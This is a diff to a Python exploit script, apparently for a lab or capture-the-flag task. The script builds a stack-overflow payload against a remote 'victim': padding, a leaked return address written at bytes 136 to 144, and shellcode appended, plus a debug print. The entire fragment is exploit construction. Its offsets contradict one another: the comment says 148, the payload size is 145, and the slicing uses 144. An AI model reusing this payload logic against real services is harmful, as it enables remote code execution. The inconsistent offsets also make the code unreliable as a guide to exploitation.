@@ -29,9 +29,9 @@ for i in range(7):
     print(str(victim.recvline(), "latin-1"))
 
 
-# the place where it crashed was 136
-# set the payload to be the codes to where the base pointer is (136) plus the shell code
-payload_size = 136 + len(shellcode)
+# the place where it crashed was 148
+# set the payload to be the codes to where the base pointer ends (136) + the return address (8 more bytes) + plus the shell code
+payload_size = 145 + len(shellcode)
 # set it to A
 payload = "A" * payload_size
 # convert it to bytearray
@@ -56,6 +56,7 @@ payload[136:144] = ret_addr  #0x20
 
 # set the payload
 payload[144:] = shellcode #b"B"*len(shellcode)#shellcode
+print(len(payload), len(shellcode),  len(payload) - len(shellcode))
 #print("shell code is", shellcode)
 #print("paytload is", payload)
 #print("mem leak", mem_leak)
